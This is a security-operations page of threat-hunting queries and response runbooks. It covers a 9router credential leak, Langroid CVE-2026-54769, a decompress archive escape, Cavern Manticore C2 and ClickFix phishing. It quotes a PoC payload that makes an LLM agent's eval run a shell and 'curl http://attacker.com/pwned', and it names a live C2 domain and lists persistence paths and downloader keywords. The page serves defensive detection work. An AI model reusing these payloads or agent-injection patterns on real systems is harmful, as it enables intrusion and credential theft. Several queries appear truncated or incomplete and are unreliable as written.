9router API-key leak via unauthenticated GET /api/usage/stats and /api/usage/request-logs AIActions on Objectives High
Hunts successful GET requests to /api/usage/stats (returns full plaintext sk- API keys, per-account cost data) and /api/usage/request-logs (all users' request history incl. emails) — the unauthenticated credential-exposure endpoints in the advisory. Any 200 here means secrets were served without auth. Rationale: /api/usage/stats returning 200 literally serves plaintext sk- keys and per-key cost data per the advisory, and /api/usage/request-logs serves all users' history with emails — both are named unauthenticated endpoints, so a successful GET is a confirmed secret disclosure, not just an attempt. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431
ATT&CKT1528 T1552.001
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admin opening the 9router usage/billing dashboard which fetches these endpoints
  • Internal billing/reporting exporter scraping usage stats on a schedule
  • Monitoring probe validating the endpoint is up
Suppression filter
| where SrcIpAddr !in ("<admin-and-billing-exporter-IPs>")
Response runbook
1) Triage: identify SrcIpAddr and whether the request was authenticated; if external/unknown, treat every sk- key and OAuth token stored in that 9router instance as compromised. Correlate response byte-size — larger bodies = full key dump. 2) Contain: immediately rotate ALL provider API keys (OpenAI sk-, GitHub Copilot OAuth tokens, Cloudflare account creds) referenced by the instance, block the source, gate /api/usage/* behind auth, upgrade to >=0.4.45. 3) Hunt: search external AI-provider billing/usage for anomalous calls using the leaked keys; check for concurrent /api/usage/request-details enumeration (conversation exfil) from the same src.
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath in ("/api/usage/stats","/api/usage/request-logs")
| where HttpMethod == "GET"
| extend Status = toint(HttpStatusCode)
| where Status == 200
| project TimeGenerated, SrcIpAddr, HttpHostName, UrlPath, Status, HttpResponseBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Bulk enumeration of 9router /api/usage/request-details (conversation-history exfiltration) AIActions on Objectives Medium
Hunts a single source sequentially pulling many distinct /api/usage/request-details/:id records — each returns another user's full conversation (system prompts, user/assistant messages, tool calls, reasoning traces) with no auth. High distinct-UUID count or large cumulative response volume from one src indicates mass conversation exfiltration. Rationale: /api/usage/request-details/:id returns full cross-user conversation contents per the advisory; a single src pulling 25+ distinct request UUIDs (200 responses) in 30 minutes is enumeration/exfil of other users' sessions, distinguishable from a user reviewing their own handful of requests. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431
ATT&CKT1530 T1213
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admin auditing usage by opening many request details in the dashboard
  • Internal data-export/backup job iterating request records
  • Analytics pipeline reading conversation records for QA
  • Load/soak test replaying many request-detail IDs
Suppression filter
| where SrcIpAddr !in ("<admin-and-export-job-IPs>")
Response runbook
1) Triage: confirm the source is unauthenticated/external and count distinct UUIDs + total bytes served — high both = full conversation-store dump. Sample which conversations were pulled (any containing embedded secrets in prompts?). 2) Contain: block the source, gate /api/usage/request-details behind auth, upgrade to >=0.4.45; notify data-owner/DPO as user prompt/response content (potentially PII/secrets) was disclosed. 3) Hunt: correlate the same src with /api/usage/stats (key leak) and /api/providers mutation; review any secrets/tokens that appeared inside leaked prompts and rotate them.

Langroid python agent spawning shell child — CVE-2026-54769 pandas_eval os.system RCE AIExploitation High
Hunts the exploitation moment of CVE-2026-54769 where TableChatAgent.pandas_eval()/VectorStore eval() runs LLM-supplied Python like __import__('os').system(...), causing the host python process to spawn a /bin/sh child that executes the attacker command (the PoC uses touch /tmp/rce_success_table and curl http://attacker.com/pwned). Article-specific because it keys on a python parent immediately spawning a shell running the exact payload markers from the advisory. Rationale: Uses the advisory's concrete exploitation shape — python (Langroid) spawning a shell that runs the exact PoC markers touch /tmp/rce_success_table and curl, the OS-level fingerprint of __import__('os').system(). Cross-checked GHSA and GitLab advisory (patched 0.65.2, CVSS 10). Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/ • https://attack.mitre.org/techniques/T1059/006/
ATT&CKT1059.006 T1203
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Data-science python apps legitimately shelling out to curl/wget for dataset downloads
  • CI/CD python build scripts running chmod +x on artifacts in /tmp
  • Jupyter notebooks where a user runs os.system or ! shell magics
  • Legitimate Langroid deployments where a benign pandas expression happens to invoke a subprocess
  • Container entrypoint python wrappers that touch marker files in /tmp
Suppression filter
| where not (ProcessCommandLine has_any ("/opt/conda/","pip install","apt-get") and InitiatingProcessCommandLine has_any ("jupyter","ci-runner","build.py"))
Response runbook
1) Triage: pull the full process tree for the alerting host — confirm the python parent is a Langroid agent process and inspect the shell child's command line for network fetch or file drop. Check whether the installed langroid version is <=0.65.1. 2) Contain: isolate the host, kill the python agent process, and revoke any credentials/API keys reachable from that process environment; block the outbound destination the shell contacted. 3) Hunt: search the same host and peers for follow-on curl/wget downloads, new files in /tmp, cron/systemd persistence, and reverse-shell listeners; review agent input logs for the injected pandas_eval expression.

Ingress tool transfer from Langroid RCE — shell/python-descended curl/wget public egress (CVE-2026-54769) AICommand & Control Medium
Hunts post-exploitation payload staging after CVE-2026-54769, where the eval-injected os.system('curl http://attacker.com/pwned') causes curl/wget (spawned by the shell that python launched) to reach an external host. Article-specific because it ties the curl/wget egress back to a shell/python parent rather than flagging all curl usage. Rationale: Directly models the advisory's curl http://attacker.com/pwned staging step, anchored to a shell/python parent to stay tied to the eval-escape chain rather than generic downloads. Sentinel expressed process-side because ASIM lacks per-process network attribution. Corroborated via GHSA/GitLab advisory. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/ • https://attack.mitre.org/techniques/T1105/

Langroid full_eval=True dangerous config & eval-injection signature (CVE-2026-54769) AIExploitation Low
Config/exposure hunt for CVE-2026-54769: surfaces Langroid deployments that enable the gating parameter full_eval=True and python command lines carrying the vulnerable pandas_eval / TableChatAgent / VectorStore code paths. Article-specific because full_eval=True is the exact precondition the advisory names for the eval() sandbox escape in table_chat_agent.py L239 and vector_store/base.py L225. Rationale: Keys on the advisory's exact gating condition full_eval=True and the named vulnerable components (pandas_eval, TableChatAgent, table_chat_agent.py, vector_store/base.py) so SOCs can inventory exposed hosts running langroid<=0.65.1 before exploitation. Low confidence because config typically lives in files, not always the process cmdline. Corroborated via GHSA/GitLab (fixed 0.65.2). Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
ATT&CKT1203 T1059.006

  • Developers testing TableChatAgent locally with sample DataFrames
  • Security researchers reproducing the PoC in a lab
  • Log lines echoing configuration during app startup without actual exploitation
  • CI test suites that import langroid.agent.special.table_chat_agent
Response runbook
1) Triage: confirm the host runs langroid<=0.65.1 and whether full_eval=True is actually set for a production, internet-/LLM-facing agent versus a local test. 2) Contain: disable full_eval / set full_eval=False, or upgrade langroid to >=0.65.2; restrict the agent's OS privileges and network egress. 3) Hunt: on any confirmed exposed host, pivot to UC1/UC2 to check for python->shell spawns or curl/wget staging that would indicate the config was already abused.

Vulnerable @xhmikosr/decompress or decompress package present (CVE-2026-53486) AIWeaponization High
Inventory hunt that surfaces hosts carrying a decompress version affected by CVE-2026-53486 (@xhmikosr/decompress < 10.2.1, >= 11.0.0 < 11.1.3, or unmaintained decompress <= 4.2.1). These hosts can be pushed a crafted archive that writes/reads files outside the extraction directory, so they are the exposure baseline for the runtime detections below. Rationale: Keys off the exact CVE id CVE-2026-53486 from the advisory; TVM already tracks the fixed versions (10.2.1 / 11.1.3) so this is a clean deploy-blast-radius hunt rather than a behavioural one. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/ • https://vulert.com/vuln-db/CVE-2026-53486
ATT&CKT1195.001
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Package present but pinned behind a build stage that never extracts untrusted archives (dev-only devDependency)
  • Transitive copy already deduped to a fixed version at runtime while the tree still lists the vulnerable range
  • Container image layer cached with the old version but overridden at runtime
  • Air-gapped host that only ever extracts internally-produced archives
  • SBOM lists the package but the code path is dead / behind a disabled feature flag
Response runbook
Step 1 (triage): confirm the resolved runtime version (npm ls @xhmikosr/decompress / decompress) — a lockfile range is not the installed version. Step 2 (contain): for any host that extracts network-sourced archives, bump to @xhmikosr/decompress 11.1.3 (or 10.2.1) and, as interim mitigation, run extraction as a non-root user. Step 3 (hunt): pivot to the runtime UCs below on the same DeviceName to check whether an escape has already been attempted (symlink/hardlink creation, writes to /etc/cron.d, /etc/ld.so.preload, ~/.ssh/authorized_keys).
DeviceTvmSoftwareVulnerabilities

Node archive-extraction process writing to Linux persistence paths (decompress dir-escape) AIInstallation Medium
Hunts a Node.js process (the runtime that hosts the vulnerable decompress library) creating or modifying files under canonical persistence locations — cron drop-dirs, systemd unit dirs, sudoers.d, and SSH authorized_keys. CVE-2026-53486 lets a crafted archive escape the extraction root and land an entry anywhere the process can write; these directories are the highest-value landing zones and none are ever a legitimate output target for archive extraction. Rationale: Article states a crafted entry can be written 'outside that directory'; a node process (the decompress host) writing into cron/systemd/sudoers/authorized_keys is never a legitimate extraction target, so the destination path itself is the escape signal. Persistence paths are the MITRE-canonical landing zones for a write-anywhere primitive, not verbatim advisory strings — flagged as hunting for that reason. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9
ATT&CKT1053.003 T1098.004 T1543.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A Node-based config-management/IaC agent (e.g. a homegrown deployer) that legitimately writes systemd units
  • Node process management tools like pm2 generating a systemd unit via 'pm2 startup'
  • A CI runner written in Node that provisions cron jobs as part of a build
  • Cloud-init or provisioning scripts that shell out to node to template a sudoers.d fragment
  • Developer tooling that writes ~/.ssh/authorized_keys during a workstation bootstrap
Suppression filter
| where InitiatingProcessCommandLine !has "pm2" and InitiatingProcessCommandLine !has_any ("startup","deploy")
Response runbook
Step 1 (triage): pull the InitiatingProcessCommandLine and parent chain — a legitimate extraction targets an app/tmp dir, not /etc; confirm whether an archive was fetched over the network moments before (correlate FileCreated of a .tar/.zip in a temp dir by the same node PID). Step 2 (contain): quarantine/rollback the written file (cron/unit/authorized_keys), kill the node process, and revoke any SSH key added. Step 3 (hunt): sweep the host for the symlink/hardlink escape UC and for setuid/ld.so.preload writes; check for outbound C2 from any cron/systemd payload just dropped.

| where (FolderPath has_any ("/etc/cron.d","/etc/cron.hourly","/etc/cron.daily","/etc/cron.weekly","/etc/systemd/system","/usr/lib/systemd/system","/etc/sudoers.d")
        or (FileName =~ "authorized_keys" and FolderPath has "/.ssh"))

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FileName, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc

Node extraction writing ld.so.preload or setuid/privileged path as root (CVE-2026-53486 privesc) AIInstallation High
Alerts when a Node.js process running as root writes /etc/ld.so.preload or drops into privileged binary dirs (/usr/local/sbin, /usr/local/bin) during archive extraction. CVE-2026-53486 applies file modes with 'mode & ~umask', preserving setuid/setgid bits, and lets entries escape the output dir — so a root-context extraction can plant a preloaded library or a setuid binary for privilege escalation. This is near-zero in normal operation. Rationale: Anchored to the advisory's mode-bit finding ('File modes were applied as mode & ~umask ... does not remove the setuid, setgid, or sticky bits ... matters when extraction runs as root'). ld.so.preload and setuid drops into /usr/local/s?bin are the canonical root-write privesc targets for that primitive; keyed on InitiatingProcessAccountName==root to keep FP near zero. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/
ATT&CKT1548.001 T1574.006
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A root-run Node build tool legitimately installing a native addon into /usr/local/bin
  • node-gyp / install scripts placing compiled helpers under /usr/local during a package build
  • In-house deployment tooling written in Node that manages ld.so.conf.d for custom libs
  • Container entrypoint (running as root) that node-templates a binary into /usr/local/bin
  • Monitoring/APM agent installers shelling through node to drop a preload shim
Suppression filter
| where InitiatingProcessCommandLine !has "node-gyp" and InitiatingProcessCommandLine !has_any ("install","rebuild","prebuild")
Response runbook
Step 1 (triage): inspect the written file — dump /etc/ld.so.preload contents or stat the /usr/local binary for setuid/setgid bits; confirm no legitimate root-run build (node-gyp, npm install of a native module) explains it. Step 2 (contain): isolate the host, remove the preload entry / setuid binary, and rotate any credentials reachable from root on that box; if in a container, kill and rebuild from a patched image (decompress >= 11.1.3). Step 3 (hunt): review process executions immediately after the write for any binary that loaded the preloaded library or ran with elevated tokens, and check the same host for the symlink-escape and persistence-path UCs.

| where InitiatingProcessAccountName =~ "root"
| where FolderPath has "/etc/ld.so.preload" or FileName =~ "ld.so.preload"
      or FolderPath has_any ("/usr/local/sbin","/usr/local/bin","/etc/ld.so.conf.d")
| where InitiatingProcessParentFileName !in~ ("dpkg","apt","apt-get","rpm","yum","dnf","make","cloud-init")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FileName, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent

| where ActingProcessName has_any ("node","nodejs")
| where ActorUsername =~ "root"

| order by TimeGenerated desc

Cavern Manticore uxtheme.dll side-load via WinDirStat/SysAid (Cavern Agent) AIInstallation High
Hunts the trojanized uxtheme.dll carrying the Cavern Agent, side-loaded against a legitimate signed binary (WinDirStat, delivered via SysAid's update feature) from a non-System32 directory. The real uxtheme.dll only ever loads from Windows system directories, so any load/drop from an application or temp path is anomalous. Rationale: Pivots on the article's named side-loaded artifact (uxtheme.dll = Cavern Agent) plus the invariant that the real uxtheme.dll only loads from Windows system dirs; corroborated by CyberSecurityNews naming WinDirStat as the signed host binary. Cross-checked against: • https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/ • https://cybersecuritynews.com/cavern-manticore-abuses-sysaid-rmm-and-windirstat-dll-sideloading/
ATT&CKT1574.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer/test machines running a locally-built uxtheme.dll from a project output folder
  • Legacy theming utilities that ship their own uxtheme.dll copy
  • Portable-app launchers that stage system DLLs alongside the executable
  • Software packagers/installers momentarily extracting uxtheme.dll to a temp dir before moving to System32
Suppression filter
| where InitiatingProcessFolderPath !startswith @"C:\Program Files\Microsoft Visual Studio" and InitiatingProcessFileName !in~ ("devenv.exe","msbuild.exe")
Response runbook
1) Triage: pull the SHA256 and InitiatingProcess of the loading binary; verify whether the loader is windirstat.exe or a SysAid updater and whether the DLL is Microsoft-signed. Detonate/hash-check the uxtheme.dll against known-good. 2) Contain: isolate the host, block the file hash org-wide, and suspend the SysAid update/RMM channel pending review since it is the delivery vector. 3) Hunt: search all hosts for the same uxtheme.dll hash and for the Cavern module DLLs (n-HTCommp.dll, mhm.dll, db.dll, ode.dll, n-ten.dll, n-sws.dll) and for beaconing to hospitalinstallation.com.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where FileName =~ "uxtheme.dll"
| where FolderPath !startswith @"C:\Windows\System32"
    and FolderPath !startswith @"C:\Windows\SysWOW64"
    and FolderPath !startswith @"C:\Windows\WinSxS"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "uxtheme.dll"
| where TargetFilePath !startswith @"C:\Windows\"
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileSHA256,
          ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Cavern C2 module DLLs loaded (n-HTCommp/n-ten/n-sws/mhm/ode/db) AIInstallation High
Hunts on-disk presence or loading of the five Cavern post-exploitation modules and the n-HTCommp communication DLL fetched by the Cavern Agent. The n- prefixed Native-AOT modules (loaded via LoadLibraryA) carry highly-unusual filenames that rarely collide with legitimate software. Rationale: Uses the exact module filenames enumerated by Check Point Research; the n-HTCommp/n-ten/n-sws Native-AOT names are near-unique, giving high fidelity even though generic db.dll/ode.dll add some noise. Cross-checked against: • https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/ • https://cybersecuritynews.com/cavern-manticore-abuses-sysaid-rmm-and-windirstat-dll-sideloading/

  • Internal line-of-business tools that name a helper module mhm.dll
  • Backup/AV tooling temporarily staging DLLs with short names
  • Developer build outputs containing db.dll in bin directories
Suppression filter
| where not (FileName in~ ("db.dll","ode.dll") and (FolderPath startswith @"C:\Program Files" or InitiatingProcessFolderPath startswith @"C:\Program Files"))
Response runbook
1) Triage: prioritize hits on n-HTCommp.dll/n-ten.dll/n-sws.dll (near-unique). Capture the loading process, SHA256, and file path; check whether the loader is the same host process as any uxtheme.dll side-load. 2) Contain: isolate the host, block all matching module hashes, and capture memory before reboot to preserve AppDomain-isolated modules. 3) Hunt: correlate the loading host with outbound traffic to hospitalinstallation.com and with LDAP/SMB brute-force (ode.dll/n-ten.dll behaviours) and SOCKS5/WebSocket tunneling (n-sws.dll) across the environment.

Cavern Manticore C2 beacon to hospitalinstallation.com (HTTPS/WebSocket) AICommand & Control High
Hunts endpoint, DNS, and proxy telemetry for connections to the Cavern C2 server hospitalinstallation[.]com, which the n-HTCommp.dll communication module contacts over HTTPS or WebSocket to pull post-exploitation modules. Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researchers/sandbox VMs deliberately resolving the IOC for analysis
  • Threat-intel enrichment tooling performing passive-DNS lookups of the domain
  • Proxy category-lookup services pre-fetching the domain for classification
  • A sinkholed version of the domain being resolved by internal DNS after takedown
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe") and InitiatingProcessFolderPath !has @"\Windows Defender\"
Response runbook
1) Triage: identify the initiating process for the connection/resolution; if it is uxtheme.dll's host process (windirstat.exe/SysAid updater) treat as confirmed. Note RemoteIP for infrastructure pivoting. 2) Contain: sinkhole/block hospitalinstallation.com and its resolved IPs at DNS and egress, then isolate every host that resolved it. 3) Hunt: on each beaconing host look for the uxtheme.dll side-load and Cavern module DLLs, and expand to second-hop IT-provider hosts given the supply-chain lateral movement pattern described in the report.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "hospitalinstallation.com"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort,
          InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
union isfuzzy=true
  (DnsEvents
    | where TimeGenerated > ago(30d)
    | where Name has "hospitalinstallation.com"
    | project TimeGenerated, Host=Computer, SrcIp=ClientIP, Indicator=Name, Src="DNS"),
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationHostName has "hospitalinstallation.com" or RequestURL has "hospitalinstallation.com"
    | project TimeGenerated, Host=SourceHostName, SrcIp=SourceIP, Indicator=coalesce(DestinationHostName, RequestURL), Src="Proxy")
| order by TimeGenerated desc
title: Cavern C2 Domain Resolution (hospitalinstallation.com)
id: 3f9c8b1d-2e57-4a06-9d43-7c1b6e0f2a55
description: Detects DNS resolution of the Cavern Manticore C2 domain hospitalinstallation.com contacted by the n-HTCommp.dll communication module over HTTPS/WebSocket.
references:
  - https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/
  - https://thehackernews.com/2026/07/iran-linked-hackers-use-new-cavern-c2.html
author: SOC Detection Engineering
date: 2026/07/07
tags:
  - attack.t1071.001
  - attack.command_and_control
logsource:
  category: dns
  product: windows
detection:
  selection:
    QueryName|endswith: 'hospitalinstallation.com'
  condition: selection
level: high
source:windows.sysmon @EventID:3 @DestinationHostname:(*hospitalinstallation.com* OR *HOSPITALINSTALLATION.COM*)
#event_simpleName=DnsRequest
| DomainName=/hospitalinstallation\.com$/i
| groupBy([aid, ComputerName, DomainName, ContextImageFileName], function=count())
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Resolution where DNS.query="*hospitalinstallation.com*" by DNS.src DNS.dest DNS.query DNS.answer | `drop_dm_object_name(DNS)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Resolution where DNS.query="*hospitalinstallation.com*" by DNS.src DNS.dest DNS.query DNS.answer | `drop_dm_object_name(DNS)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | sort - lastTime
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",

                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user

| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

title: FakeCaptcha / ClickFix - Clipboard-Injected PowerShell from Explorer
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d06
status: experimental
description: |
    "FakeCaptcha" / "ClickFix" social-engineering: malicious site asks
    user to press Win+R and paste a payload. The result is
    powershell/mshta launched directly from explorer.exe with iex /
    base64 / downloadstring in the command line.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1204/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1204.002
    - attack.execution

    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\RuntimeBroker.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'
    selection_cmd:
        CommandLine|contains:
            - 'iex'
            - 'invoke-expression'
            - 'frombase64'
            - 'downloadstring'
            - 'hxxp'
            - 'curl '
            - 'wget '
    condition: selection_parent and selection_child and selection_cmd
falsepositives:
    - IT-driven scripted automation that admins paste-launch
level: high

